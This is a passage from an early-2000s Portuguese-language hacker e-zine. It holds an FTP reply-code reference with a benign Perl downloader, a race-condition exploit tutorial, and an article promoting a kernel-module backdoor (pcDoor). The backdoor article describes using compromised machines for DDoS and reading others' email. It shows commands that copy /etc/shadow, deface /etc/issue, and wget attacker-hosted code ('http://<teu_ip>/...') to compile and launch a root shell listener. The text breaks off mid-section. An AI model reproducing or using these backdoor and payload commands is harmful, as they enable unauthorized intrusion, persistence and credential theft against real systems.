
      200 Command OK
          Significa que o comando executado foi tratado sem erros.
      500 Syntax error, command unrecognized.
          Houve um erro na sintaxe do uso do comando. Entre eles pode
          ser um erro de linha muito grande usada no parametro.
      501 Syntax error in parameters or arguments.
          Houve um erro no uso do parametro dos comando
      202 Command not implemented, superfluous at this site.
          O comando nao eh suportado pelo servidor por seu uso nao
          ser necessario no servidor.
      502 Command not implemented.
          O comando apenas nao eh suportado pelo servidor.
      503 Bad sequence of commands.
          Foi usada uma mah sequencia de comandos.
      504 Command not implemented for that parameter.
          O comando usado nao usa o tipo de argumento usado.
      110 Restart marker reply.
          Mostra uma marca definida. Segue o formato:
          MARK yyyy = mmmm
          Aonde yyyy eh uma marca e mmmm eh a marca equivalente do servidor.
      211 System status, or system help reply.
          Eh usado tanto em respostas a um comando HELP ou para mostrar o
          status do sistema pelo comando STAT
      212 Directory status.
          Mostra o status de um diretorio.
      213 File status.
          Mostra o status de um arquivo.
      214 Help message.
          Mostra a resposta de um comando HELP em particular.
      215 NAME system type.
          Mostra o tipo de SO em que o servidor roda.
      120 Service ready in nnn minutes.          
      220 Service ready for new user.
      221 Service closing control connection.
          Mensagem de despedida do servidor.
      421 Service not available, closing control connection.
          O servidor FTP estah desativado.
      125 Data connection already open
      225 Data connection open
      425 Can't open data connection.
      226 Closing data connection.
          Mostra que a acao relacionada a um arquivo como uma transferencia
          ou aborto foi completada com sucesso.
      426 Connection closed
          Diz que a conexao foi fechada e a transferencia abortada.
      227 Entering Passive Mode (h1,h2,h3,h4,p1,p2).
          O servidor entrou no modo passivo (poderosa cor de rosa que leva...)
          e assim estah pronto para receber um arquivo do cliente no caso de
          um UPLOAD.
      230 User logged in, proceed.
          O cliente se logou no servidor com sucesso.
      530 Not logged in.
          O cliente nao conseguiu logar no servidor. Provavelmente o
          login/senha estah incorreto.
      331 User name okay, need password.
          Recebido apos um comando USER, diz que o cliente agora pode enviar
          o comando PASS
      332 Need account for login.
          O cliente precisa de uma conta no sistema para se logar.
      532 Need account for storing files.
          O cliente precisa de uma conta no sistema para enviar arquivos.
      150 File status okay
          Estah pronto para abrir conexao.
      250 Requested file action okay, completed.
          A acao relacionada a um tratamento de arquivo foi completa com
          sucesso.
      257 "DIRETORIO" created.
          Quando o diretorio "DIRETORIO" foi criado com sucesso.
      350 Requested file action pending further information.
      450 Requested file action not taken.
          O arquivo requerido nao estah disponivel.
      550 Requested action not taken.
          O arquivo requerido nao estah disponivel (arquivo nao encontrado
          ou nao possui acesso)
      451 Requested action aborted. Local error in processing.
      551 Requested action aborted. Page type unknown.
      452 Requested action not taken.
          Nao ha espaco em disco no servidor para salvar seu upload.
      552 Requested file action aborted.
          O limite de estocagem no servidor foi excedido e por isso foi
          abortado.
      553 Requested action not taken.
          O Arquivo nao foi permitido (incorreto).


                               ----------------
                              |  Secao FTP de  |
                              |     Exemplo    |
                               ----------------


220 ProFTPD 1.2.2rc3 Server (Hazard Zone) [localhost]
USER pchaz                                 # o login
331 Password required for struck.
PASS nd.qd3.ns                             # a porta
230 User pchaz logged in.
SYST                                       # tipo de sistema
215 UNIX Type: L8
CWD /                                      # muda pro diretorio /
250 CWD command successful.
PORT 127,0,0,1,4,33                        # prepara pra receber algo
200 PORT command successful.
LIST                                       # recebe a lista de arquivos do /
150 Opening ASCII mode data connection for file list.
drwxr-xr-x   3 root     root         4096 May 16 05:49 2.2.19
drwxr-xr-x   2 root     bin          4096 May 29 21:40 bin
drwxr-xr-x   2 root     root         4096 Sep 21 15:24 boot
drwxr-xr-x  10 root     root        32768 Sep 24 00:50 dev
drwxr-xr-x  23 root     root         4096 Sep 24 00:49 etc
drwxr-xr-x  22 root     root         4096 Sep 18 07:55 home
drwxr-xr-x   2 root     root         4096 Sep 20 04:45 kylix
drwxr-xr-x   3 root     root         4096 Jan 12  2001 lib
drwxr-xr-x   2 root     root        16384 May 15 20:51 lost+found
drwxr-xr-x   3 root     root         4096 Sep 20 03:16 misc
drwxr-xr-x   7 root     root         4096 Aug 23 05:55 mnt
drwxr-xr-x   6 root     root         4096 Sep 21 16:13 opt
dr-xr-xr-x  46 root     root            0 Sep 23 20:47 proc
drwx--x---  42 root     root         4096 Sep 24 00:52 root
drwxr-xr-x   2 root     bin          4096 Sep 18 08:00 sbin
drwxrwxrwx   8 root     root         4096 Sep 24 01:23 tmp
-rw-r--r--   1 root     root          117 Sep 20 03:47 used.txt
drwxr-xr-x  19 root     root         4096 May 29 21:40 usr
drwxr-xr-x  17 root     root         4096 May 29 21:40 var
-rw-r--r--   1 root     root      1042703 May 16 05:55 vmlinuz
226 Transfer complete.
TYPE A                                     # prepara pra receber como ASCII
200 Type set to A.
PORT 127,0,0,1,4,35                        # define o ip e porta pra receber algo
200 PORT command successful.
RETR /etc/issue                            # pega o arquivo /etc/issue
150 Opening ASCII mode data connection for issue.txt (549 bytes).


            /////////        //
           //     //        //
          //     //        //
         //     //        //
        ////////  ////// /////// /////// ///////  ///////  //////   //////
       //        //     //   // //   //     //   //   //  //   //  //   //
      //        //     //   // ///////   //     ///////  //////   //   //
     //        ////// //   // //   //  /////// //   //  //   //  //////

     
226 Transfer complete.
QUIT
221 Goodbye.


                              ------------------
                             | Clientes SMTP de |
                             |     Exemplo      |
                              ------------------

                             
FTPGet
<++> protocolos/ftp/ftpget.pl
#!/usr/bin/perl
# Recebe um arquivo de um servidor FTP remoto
# Se o arquivo local existir tenta continuar o download de
# onde parou...
# 2001 by pcHazard
# BrasNet #tresamigos #fashion_eh_meu_ovo

use IO::Socket;
use integer;

my $ftpsock;
my $ftpserver = $ARGV[0];
my $ftpfile  = $ARGV[1];
my $txt;
my $listen;
my ($dir,$file);

usage() if (!defined($ftpfile));


$dir  = extractfilepath($ftpfile);
$file = extractfilename($ftpfile);


conecta();
autentica();
pegaoarquivo();

sub usage
{
   print STDERR "

===========================================
                 FTPGet.pl
            from fatal3rror #06
===========================================
Uso: $0 <servidor_ftp> <arquivo>
Ex1: $0 ftp.ee.lbl.gov libpcap.tar.Z
Ex2: $0 gatekeeper.dec.com /pub/DEC/net/bpfext42.tar.Z
===========================================


";
   exit(-1);
}

sub conecta
{
   print "[+] Conectando em $ftpserver:21...\n";
   $ftpsock = IO::Socket::INET->new(PeerHost   => "$ftpserver",
                                    PeerPort   => '21',
                                    Proto      => 'tcp' );
   unless($ftpsock)
   {
      print "[-] Houston, temos um problema aki... $!\n";
      exit(-1);
   }
   print "[+] Conectado !\n";
   
   # Recebe o banner do servidor, soh pra limpar a fila de
   # dados do socket :)
   recv($ftpsock,$txt,1024,0);
}

sub autentica
{
   print "[+] Enviando USER...\n";
   print $ftpsock "USER ftp\n";
   recv($ftpsock,$txt,1024,0);
   print "[+] Enviando PASS...\n";
   print $ftpsock "PASS cybercrash\@ig.com.br\n";
   if (replycode() ne "230")
   {
      print STDERR "[-] Oops... Erro autenticando :~(\n";
      exit (-1);
   }
   print "[+] Autenticado !\n";
}

sub replycode
{
   # Retorna o codigo resultante da ultima operacao...
   # Essa sujeira toda eh pro caso de replycodes que tenham mensagens
   # de texto, do tipo do arquivo welcome.msg
   while (1)
   {
      recv($ftpsock,$txt,1024,0);
      @linhas = split("\n","$txt");
      foreach $txt (@linhas)
      {
         $code     = substr($txt,0,4);
         $primeiro = substr($code,0,1);
         $simbolo  = substr($code,3,1);
         return substr($txt,0,3) if (($primeiro ne " ") && ($simbolo eq " "));
      }
   }
}

sub pegaoarquivo
{
   if ($dir)
   {
      print "[+] Indo para o diretorio $dir...\n";
      print $ftpsock "CWD $dir\n";
      if (replycode() ne "250")
      {
         print STDERR "[-] Oops... Diretorio Invalido... \n";
         exit (-1);
      }
   }
   print "[+] Tudo ocorreu bem ateh agora... vamos pegar agora o dito cujo...\n";
   print "[+] Modo binario...\n";
   print $ftpsock "TYPE I\n";
   replycode();
   $listen = port();
   # Prepara o socket que vai receber a descricao do arquivo...
   print $ftpsock "LIST $file\n";
   if (replycode() ne "150")
   {
      print STDERR "[-] Oops... Arquivo Invalido... \n";
      exit (-1);
   }
   $recvsock = $listen->accept();
   recv($recvsock, $list,1024,0);
   close($recvsock);
   chop($list);
   $filesize = (split(" ",$list))[4];
   print STDERR "[+] Arquivo: $file Tamanho: $filesize\n";
   # Envia o pedido pra pegar o arquivo...
   $listener = port();
   $localsize = getfilesize($file);
   if ($localsize)
   {
      if ($filesize == $localsize)
      {
         print "[-] O arquivo $file jah foi completamente recebido.\n";
         print $ftpsock "QUIT\n";
         exit(-1);
      }
      print "[+] Continuando o download de $file na posicao $localsize...\n";
      print $ftpsock "REST $localsize\n";
      if (replycode() ne "350")
      {
         print "[-] Houve um erro continuando o download...\n";
         print $ftpsock "QUIT\n";
         exit(-1);
      }
      open(ARQ,">> $file");
      $recebido = $localsize;
   }
   else
   {
      print "[+] Comecando o download do arquivo $file\n";
      open(ARQ,"> $file");
      $recebido = 0;
   }
   print $ftpsock "RETR $file\n";
   recv($ftpsock,$txt,1024,0);
   chop($txt);
   $listen = $listener->accept();
   D: while (1)
   {
      $rec = read($listen,$buff,128000);
      last D if ($rec == 0);
      print ARQ $buff;
      $recebido = $recebido + $rec;
      drawprogress($recebido, $filesize);
   }
   recv($ftpsock,$txt,1024,0);
   chop($txt);
   print "\n[+] Recebido.\n";
   print $ftpsock "QUIT\n";
   close ($ftpsock);
   exit(0);
}

sub port
{
   # Retirado do /usr/lib/perl5/site_perl/Net/FTP.pm

   $listen = IO::Socket::INET->new(Listen    => 5,
                                   Proto     => 'tcp',  );

   # Esse pedaco foi mudado por mim porcausa de um bug (?)
   # no $listen->sockhost, que ao inves de retornar 127.0.0.1
   # retornava 0.0.0.0
   # Provavelmente eh um problema de configuracao da minha
   # maquina mesmo :)
   
   $mysockhost = $listen->sockhost;
   $mysockhost = "127.0.0.1" if ($mysockhost eq "0.0.0.0");
   my($myport, @myaddr) = ($listen->sockport, split(/\./,$mysockhost));

   # Fim
   
   $port = join(',', @myaddr, $myport >> 8, $myport & 0xff);
   print $ftpsock "PORT $port\n";
   if (replycode() ne "200")
   {
      print "[-] Erro no PORT...\n";
      exit(-1);
   }
   return $listen;
}

sub getfilesize
{
   return (stat($_[0]))[7];
}

sub drawprogress
{
   my ($atual,$total) = @_;

   #66433 / 6735707
   $porcento = $atual * 100;
   $porcento = $porcento / $total;
   $ibarras = ($porcento / 2) if ($porcento != 0);
   $iespacos = (50 - $ibarras);
   $barras  = "#" x $ibarras;
   $espacos = " " x $iespacos;
   print STDERR chr(13)."\[$barras$espacos\]\-\[$porcento%\]\-\[$atual\/$total\]";
}

sub extractfilepath
{
   my $file = $_[0];
   my $l = length($file);

   do {$l = $l - 1;} until ((substr($file,$l,1) eq "\/") || ($l == 0));
   return substr( $file, 0, $l);
}

sub extractfilename
{
   #/usr/bin/cat
   $s = $_[0];

   return $s if (substr($s,0,1) ne "/");
   
   my $l = length($s);
   do {$l = $l - 1;} until ((substr($s,$l,1) eq "/") || ($l == 0));
   return substr( $s, $l+1, length($s));
}
<-->
         


                          -= 16 Set 2001 11:28:46 =-
                     -= pcHazard <cybercrash@ig.com.br> =-









/*
 *  Ja que esta lendo uma materia do pchazard... Confira o profile dele:
 */
- Nick: pcHazard 
- Sexo: M 
- Tamanho do pe': 42 
- Leite: De vaca mesmo 
- Programa predileto: back orifice :D 
- Mouse: logitech 
- Bebida: coca-cola 
- Banho: arrgh ! 
- O que faz qdo ta cagando? penso na vida 
- O q diz qdo toma um fora? parto pra outra 
- Qual foi a maior loucura q ja fez? me meter com os pirul33t0s do #r00t 

        _xXXXP^''                          ``^YXXXx_
     _xXXXXP~       07 - Race Conditions       ~YXXXXx_
  _xXXXXXX(                                      )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                      )XXXXXXP~
     ~YXXXXb_           Cheat Struck           _dXXXXP~
        ~YXXXbx..                          ..xdXXXP~


   Tendo em vista o enorme interesse da galera e a pouca quantidade de 
material encontrado sobre este assunto, me arrisco a falar um pouco sobre 
tal falha. As poucas materias que encontrei sobre rcs explicavam muito mal 
o funcionamento da falha e seu exploit.
   Muitos estao confundindo race conditions com bugs de hardlinks 
(explicado no texto003 na struck.8m.com) em que basta linkar um arquivo 
temporario criado pelo programa para outro arquivo que o usuario nao tenha 
acesso e assim mudar os modos ou sobrescrever este.
   Race conditions eh um pouco mais complicado que isso.
   Como sabemos, o processador nao trabalha em paralelo, portanto apenas 
uma funcao eh processada por vez. Porem sistemas multi-tarefa como windows 
e linux tem a capacidade de executar diversos programas ao mesmo tempo. 
Issu causa uma disputam entre os processos para quem sera executado primeiro.
Isto eh conhecido como Race Condition.

   Um exemplo muito classico dessa falha, eh o seguinte:
   Provavelmente, a maioria dos leitores nao deve ter visto este bug pois 
ele ja eh bem antigo. Mas deu muita dor de cabeca para admins na epoca.
   Eh do conhecimento de todos que os processadores antigos eram mais 
lentos que os atuais (duh!) e por isso havia maiores chances de haver race 
conditions. Lembro-me de que muitas pessoas comentavam que certa vez, 
bastou conectar por telnet num server para cair na root-shell. Ae esse 
pessoal, na epoca ficava tudo sem saber o que acontecia e a falha era 
conhecida por "computadores sao assim mesmo". heheh
   Depois descobriu-se que isso era causado por uma race condition no 
logout de uma shell. Quando uma shell usada por qquer usuario fosse 
killada com um sinal especifico, o sistema chamava o programa de login 
imediatamente e habilitava o terminal para ser usado.
   Porem as vezes qdo o trafigo na maquina era muito grande, o processador 
custava a killar a shell e o login acabava sendo executado antes. Com isso 
o usuario perdido que se conectava pelo mesmo terminal, tinha acesso a 
shell ateh que esta fosse realmente killada.

   Race conditions sao muito menos comuns ultimamente, principalmente pelo 
ganho na velocidade dos processadores atuais. Porem, nunca se descarta a 
possibilidade de que em redes com mtos usuarios ocorra tal falha.

   Mas como exploitar uma falha dessas nos dias de hoje??
   Existem 2 metodos comuns para isso.
   O primeiro eh deixar rodando o exploit em loop ao mesmo tempo que o 
programa suid vulneravel e torcer para que as funcoes do exploit sejam 
executadas no momento certo.
   O segundo meio eh utilizar ptrace, gdb, etc para controlar a execucao 
do programa e trancar o programa no momento em que deve ser exploitado 
para assim nao ter que depender do processador para q ocorra tal bug.
   Note que race conditions nao sao bugs em si. Em alguns casos nao existe 
culpa por parte dos programadores qdo ocorrem race conditions. Porem 
atraves destas condicoes eh possivel exploitar outras falhas no programa 
que nao seriam possiveis durante sua execucao normal.
   As falhas encontradas mais comuns sao de hardlinks, porem overflows 
entre outros tambem sao perfeitamente possiveis.

   Como eh de costume, vou criar alguns programas exemplos para que ajudem 
o entendimento desta falha.

<++> race/boo.c
#include <stdio.h>
#include <unistd.h>

int main() {
  FILE *fd;

  for(;;) {

    sleep(3);
    if ((fd=fopen("./tst","r")) != NULL) { 
       fclose(fd);
       unlink("./tst"); 
       printf("file apagado!\n");

       sleep(3);

       if((fd=fopen("./tst","a")) == NULL) {
           fprintf(stderr,"Erro ao criar o file\n");
           exit(-1);
       } else {
           fprintf(fd,"Majin Boooooooooooooo\n");
           printf("file CRIADO!\n");
           fclose(fd);
       }
    }
  }
}
<-->

   O programa acima eh meio tosco, porem eh apenas de exemplo entao ta 
valendo. Ele verifica se o arquivo "./tst" existe, se existir apaga-o e 
cria um novo.
   Nota que o programa foi feito com o proposito de aprendizagem, por isso 
ele fika repetindo a operacao num loop infinito e forca 2 sleep() para 
garantir que o exploit funcione.
   Rode-o e note a velocidade em que as mensagens de criacao e apagamento 
sao jogadas na tela. Elas tem intervalo de 3s entre cada uma. Isso para 
que ocorra race condition no nosso caso. Se quizer testar sem os sleep, 
vai notar a velocidade que as msg aparecem dependem da velocidade com que 
o programa eh processado pela sua maquina.
   Num segundo terminal faca:

[root@struck /root]# ln -s tu tst
ln: tst: File exists
[root@struck /root]# ln -s tu tst
ln: tst: File exists
[root@struck /root]# ln -s tu tst
[root@struck /root]# cat tu
Majin Boooooooooooooo
[root@struck /root]#

   O que podemos observar acima eh que, enquanto o programa nao deletava 
o "tst" nao era possivel linka-lo para "tu". Quando ele foi deletado, a 
proxima funcao seria criar um novo arquivo com o mesmo nome. Porem como 
nos temos 3s de vantagem, conseguimos criar um link para este arquivo 
antes do programa executar a proxima funcao.
   Num plano mais detalhado, a execucao normal do programa eh:

1-Verifica se "tst" existe;
2-Deleta-o;
3-Cria novo "tst";
4-Anexa um texto a este arquivo;
5-Fecha-o.

   Mas como nossos sleeps atrasaram um pouco esta execucao, conseguimos 
linkar o arquivo entre os passos 2 e 3. Note que isto foi feito em tempo 
de execucao, ao contrario de um xploit de hardlink comum em que o link eh 
feito antes da execucao do prog.
   Se o arquivo fosse linkado antes da execucao, o programa iria apaga-lo 
antes de anexar qquer texto a ele. Teste com o mesmo programa.

[root@struck /root]# rm tst tu
[root@struck /root]# touch tu
[root@struck /root]# ln -s tst tu

   Agora execute o programa e veja se "tu" sofre alguma alteracao... Ele 
nao eh alterado pois cai no controle de existencia do arquivo (passo 1) e 
entao eh apagado.
   Se voce quizer testar uma race condition em tempo real, retire os sleep 
do codigo anterior e rode o seguinte xploit em uma outra shell:

<++> race/xploit.sh
#!/bin/sh

echo "Xpl0it teste de race conditions..."
echo "by Cheat Struck"

while [ 0 ]
do
  ln -s tu tst
  if test -L tst ; then
     break
  fi
done

echo "Vencemos a corrida!!!"
<-->

   Faca o seguinte:

<tty1>
[root@struck /root]# rm -f tst tu
[root@struck /root]# touch tu
[root@struck /root]# touch tst
[root@struck /root]# ./boo
file apagado!
file CRIADO!
file apagado!
file CRIADO!
file apagado!
...

   Entao va para o 2o terminal e rode o xploit.sh...

<tty2>
[root@struck /root]# chmod +x xploit.sh
[root@struck /root]# ./xploit.sh
Xpl0it teste de race conditions...
by Cheat Struck
ln: tst: File exists
ln: tst: File exists
ln: tst: File exists
...
Vencemos a corrida!!!
[root@struck /root]#

   Prontinho... dependendo do seu processador e de quantos processos estao 
rodando no momento, o tempo que ira levar para o xploit vencer a corrida 
varia muito.
   Bom... teoricamente tudo eh muito bunito, mas na pratica complica um 
pouco. Nao eh normal encontrarmos algoritmos como o do nosso "boo.c" em 
programas suids ou programas executados pelo root. Por tanto as chances 
para que uma race condition aconteca sao muito menores.
   Ae entra o metodo 2 de se exploitar uma race condition. 
   Agora o objetivo eh controlar a execucao do nosso programa para que 
tenhamos o momento certo de xploita-lo. Para isso usaremos uma ferramenta 
bastante conhecida... o gdb.
   Para comecar, zere os 2 arquivos novamente...

[root@struck /root]# rm -f tst tu
[root@struck /root]# touch tst tu

   Agora vamos rodar o gdb no nosso programinha. Tanto faz se ele estiver 
com ou sem os sleep()s.

[root@struck /root]# gdb boo
GNU gdb 5.0
Copyright 2000 Free Software Foundation, Inc.
...
This GDB was configured as "i386-slackware-linux"...
(gdb) disass main
Dump of assembler code for function main:
0x8048540 <main>:       push   %ebp
0x8048541 <main+1>:     mov    %esp,%ebp
...
0x8048582 <main+66>:    call   0x80483e8 <unlink>
0x8048587 <main+71>:    add    $0x10,%esp
0x804858a <main+74>:    add    $0xfffffff4,%esp
---Type <return> to continue, or q <return> to quit---q
(gdb)

   Acima usamos o comando disassembe para ver o code do main() em ASM.
   Note que no endereco 0x8048582 o arquivo eh apagado. Entao o que 
faremos aqui eh colocar um breakpoint na linha seguinte...

(gdb) break *0x8048587
Breakpoint 1 at 0x8048587
(gdb) run
Starting program: /root/a.out
Breakpoint 1, 0x8048587 in main ()
(gdb)

   O comando run serve para comecar a rodar o programa. Como pode-se 
perceber o programa parou no nosso breakpoint. Agora va a um 2o terminal 
verificar se o arquivo existe...

[root@struck /root]# ls -l tst
ls: tst: No such file or directory
[root@struck /root]# ln -s tu tst
[root@struck /root]#

   Ok... o arquivo nao existe. Entao linkamos ele para "tu" como feito 
anteriormente.
   Voltando ao gdb no primeiro terminal...

(gdb) continue
Continuing.
file apagado!
file CRIADO!

Breakpoint 1, 0x8048587 in main ()
(gdb)

   O comando acima serve para continuar a execucao do programa a partir de 
onde ele foi parado. Como o programa esta em loop, ele caiu no nosso 
breakpoint novamente.
   Neste ponto a race condition ja ocorreu. Volte ao segundo terminal e 
verifique o arquivo "tu"...

[root@struck /root]# cat tu
Majin Boooooooooooooo
[root@struck /root]#

   Pronto!!! 100x mais pratico do que o metodo anterior neh??
   Muitos xploits usam ptrace para controlar a execucao do programa e 
causar a race condition. Nao vou explicar o uso do ptrace(), portanto 
fica a seu interesse pesquizar este bug mais afundo.










        _xXXXP^''                                   ``^YXXXx_
     _xXXXXP~    08 - Backdoors, a ameaca fantasma      ~YXXXXx_
  _xXXXXXX(                  Episodio II                 )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                              )XXXXXXP~
     ~YXXXXb_                 pcHazard                 _dXXXXP~
        ~YXXXbx..                                  ..xdXXXP~

        
   Tipo, nao ha nada melhor do que ter acesso facil e garantido a um
sistema q tu jah ownou, afinal mais cedo ou mais tarde vc sempre acaba
precisando de uma outra maquina pra qq coisa, tipo, usar como ponte
pra outro sistema, usar o link dela pra DDoS eu soh pra ler e-mail
dos outros ;)

   E pra isso eh bom garantir que vc tenha acesso ao
sistema q vc ownou, e o melhor jeito de fazer isso eh usando backdoors.
Ai eh q tah a questao: qual a backdoor ideal a usar ? Esqueca aquelas
porcarias de rootkits antigas com substitutos pro ps, netstat e backdoors
do tipo /bin/sh -i no /etc/inetd.conf pq isso nao passa de porcaria
pra muleque e qq demente acha uma merda dessa :)

   As melhores backdoors sao as que nao podem ser encontradas facilmente
pelo adm. do servidor q vc ownou. Por exemplo, pegue os fontes do
mail e adicione um comando smtp a mais nele tipo, GIVEMESHELL, que
quando usado um parametro certo como senha abre uma shell root :)

Eh praticamente impossivel achar uma shell dessa a menos que o
adm. use alguma ferramenta como o tripwire etc. ou esteja rodando um
sniffer bem na hora que vc tah ativando ela, ae vc eh muito azarado
mesmo ou ele eh muito paciente :)


   Um bom exemplo de boas backdoors sao as backdoors em LKM, como
as que eu falei no issue 02 da f3 zine. Claro que como tudo nao eh facil,
pode ter alguns problemas com compatibilidade, tipo, pode ser que
a backdoor nao compile no servidor, e nem pense em levar o modulo compilado
e dar um insmod lah, pq senao teu trabalho pode ir pro espaco :-)
Apesar dos pesares, as backdoors em LKM sao as melhores backdoors, e
eh por isso que eu trouxe um presentinho de minha autoria... pcDoor v0.01
Eh uma backdoor relativamente simples pq soh redireciona o read()...

   Mas imagine o que se pode fazer tendo controle sobre todos os read()
de um sistema :) bem, se ainda nao se convenceu, eh soh nao usar :P

   Pra entender como ela funciona, eh bom entender um pouco sobre syscalls
e lkms. Entao, caso ainda nao tenha lido o issue 02 da f3zine, leia ela
agora e depois continue a ler aki...

   Syscalls sao chamadas de sistema que os programas usam para fazer
tarefas tipo ler, gravar etc... as syscalls sao responsaveis por varias
coisas feitas no sistema. Por exemplo, para ler os arquivos de um
diretorio usa-se a syscall readdir, pra abrir usa a open, pra ler read,
pra gravar write etc... veja no arquivo /usr/include/bits/syscall.h
as syscalls do teu sistema.

   Tipo, toda vez q vc tem q ler qq coisa de qq lugar no linux, vc chama
a syscall read(), pra ler de um arquivo ou socket. Tipo, pra ler em socks
tb tem as funcoes em C recv e recvfrom, mas acho q d alguma forma elas
chamam a read() tb :O

   Entao, dar uma olhada na pcDoor, q tah anexo na zine...

   Ela praticamente eh uma backdoor ideal (q modesto!) pq nao sobregrava
muitas syscalls e ao mesmo tempo permite q seja acionada de milhares
de formas diferentes...

   Resumidamente, depois de instalada, ela vai "monitorar" tudo o q
sistema ler, procurando se ela tem a string definida em SENHA_EXEC e
SENHA_HIDE... se tiver, ai eh q o bicho pega :-)

   Basicamente ela tem essas duas funcoes: Executar e esconder.
   Considere nos exemplos aki o seguinte:

#define SENHA_EXEC "pch_can_exec:"
#define SENHA_HIDE "#pch_can_hide:"

   Nao seja animal, troque essas strings antes de usar a backdoor :)
   E use coisas bem dificeis ou ateh mesmo impossiveis de se ler
casualmente, nada de "exec" ou coisa parecida ! be smart !

  .---------------.
  |    Executar    `-----------------------------------------------.
  `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -

Tudo q o sistema ler e possuir a string definida em SENHA_EXEC em seu
conteudo se encaixa aki... bem encaixadinho... uhh nossa!!! voltando ao
assunto... Essa eh a senha pra permitir q a backdoor saiba o q ela tem q
executar. Vamos aos exemplos comentados...

==============================================================================
1o. Temos uma secao normal, o pcdoor nao tah carregado ainda...
Existe no diretorio /root um arquivo chamado teste.txt
contendo a string magica SENHA_EXEC que eh "pch_can_exec:"
e um comando a executar na frente dela. Nao use o caracter
definido em
#define SPACE_REPLACEMENT 254
no comando

[root@pchazard /root]# cat teste.txt
Esta eh a linha 1
Esta eh a linha 2
Esta eh a linha 3
pch_can_exec:cp /etc/shadow /
Esta eh a linha 5
==============================================================================
2o. O diretorio raiz estah normal...

[root@pchazard /root]# ls /
bin   dev  home  lost+found  mnt  proc  sbin  usr
boot  etc  lib   misc        opt  root  tmp   var
==============================================================================
3o. Carregamos entao o poderoso modulo do pcDoor !!!!!!!

[root@pchazard /root]# insmod modulo.o
==============================================================================
4o. Vamos ver como anda o diretorio raiz agora...
hmm.. continua o mesmo :-)

[root@pchazard /root]# ls /
bin   dev  home  lost+found  mnt  proc  sbin  usr
boot  etc  lib   misc        opt  root  tmp   var
==============================================================================
5o. Lemos entao o arquivo com a string magica...
Voilah! Ele foi modificado ! Bem, serah que foi realmente modificado?
Veja o tamanho dele antes de depois de carregar o modulo e vera
que sao iguais ! Contrariamos uma lei da fisica aki ?? Nao, estamos
comecando a contrariar a lei dos administradores lammers...

[root@pchazard /root]# cat teste.txt
Esta eh a linha 1
Esta eh a linha 2
Esta eh a linha 3
==============================================================================
6o. Vejamos novamente como estah o nosso diretorio raiz...
Minha nossa! Como meu shadow foi parar lah ?!? heheh, toh
parecendo narrador de teatro de fantoche de guri do maternal :-)
o comando "/bin/cp /etc/shadow /" foi executado.
Repare que internamente o pcDoor vai chamar a execve
para /bin/sh -c <o comando> permitindo livre uso de pipes,
redirecionadores etc :-)

pch_can_exec:echo "th1s w45 0wn3d!!!" >> /etc/issue

Se preferir, mude os fontes do pcdoor para ao inves de chamar
o /bin/sh chamar o /bin/bash direto, mas eh
melhor usar o sh pq pode ser o naum tenha bash e talz...

[root@pchazard /root]# ls /
bin   dev  home  lost+found  mnt  proc  sbin    tmp  var
boot  etc  lib   misc        opt  root  shadow  usr
==============================================================================
7o. Mas, o que aconteceu com o teste.txt? Bem, todo texto depois
da string magica que nao for comando serah removido ateh a proxima
chamada do read() para o resto do bloco do texto (porque alguns programas
como o cat, os editores de texto etc, usam blocos com tamanhos, por
exemplo, de 1024 bytes etc). Por isso, se vc estiver com o modulo carregado
e abrir os fontes dele irah ver um "rombo" que comeca no inicio do
#define SENHA_EXEC "
e vai ateh sabe lah Deus aonde !!!
Bem, se vc nao gostou do texto apos a string magica ser apagado, vc
pode desabilitar nos fontes mudando aonde estah #define APAGATAG para
#undef APAGATAG. Mas eu nao recomendo, pq o fato do resto do conteudo ser
apagado e tornado totalmente invisivel ao programa q leu ele nos
abre muitas oportunidades :-) Mas, como assim?

Isso pode fazer com que ela seja carregada tambem remotamente sem alterar
o curso da secao, independente de que daemon vc tenha usado para roda-la.
No exemplo acima, de ativa-la por apenas ler um arquivo, eh preciso
que alguem de lah de dentro leia o tal texto, o que eh raro de se fazer
caso vc nao possua shell no sistema como eh o caso, creio eu, de 99 por
cento dos provedores brasileiros... Ah, uma dica, pra nao comprometer o
conteudo do arquivo original, o caso teste.txt, que pode ser qq outro,
basta colocar a string magica no final do texto :-) mas caso, por exemplo,
o cara q abriu o teste.txt no pico salvar ele, a string magica serah
apagada do file...
Caso vc esteja com shell e tente ativar a backdoor pelo bash mesmo e nao
funcionar, nao se desespere eh pq o bash le caracter por caracter ao inves
da linha de comando inteira :) pra resolver, abre o pico, edita
um arquivo .sh com tudo q vc quer rodar, por exemplo:

# pico doit.sh

#!/bin/sh
/usr/bin/wget http://<teu_ip>/over.c
gcc -o over over.c
./over <teu_ip> 25

# pico t

echo "heuaheuhaeu th1s sounds fine :-)"
pch_can_exec:sh /home/joaozinho/doit.sh

salva e dah um:

# cat t

e vai preparar un lanche :-)
Lembre-se, nunca execute programas interativos do tipo
/bin/sh -i ou qq outro pq senao vc vai se fuder :-)

Voce pode ainda fazer com que o sistema aonde o pcdoor estah rodando
faca o download de, por exemplo, um programa que libere uma shell
root numa porta qq, da tua maquina usando o comando:

pch_can_exec:wget -q -b -O /tmp/tcpshell.c http://<teu_ip>/tcpshell.c
pch_can_exec:cd /tmp;gcc -o tcpshell tcpshell.c;./tcpshell;rm tcpshell*

Rodando o wget assim ele nao se iniciarah de modo interativo, e sim
irah pra background, ai vc pode usar um programa como o iptraf por exemplo
pra ver quando o server terminou de fazer o download :)

Agora vamos ver exemplos de como ativa-la de um modo mais inteligente,
usando os servidores que a maquina alvo que estah rodando o modulo
esteja servindo. E o melhor, eh independente do protocolo usado,
pode ser TCP, UDP ou ICMP, desde que tenha um programa safado do
outro lado pra dar um read() nele :-)


           =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
                           Ativacao remota via TCP
           =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Pode ser usado qualquer um que esteja rodando no inetd, ou no irmaozinho
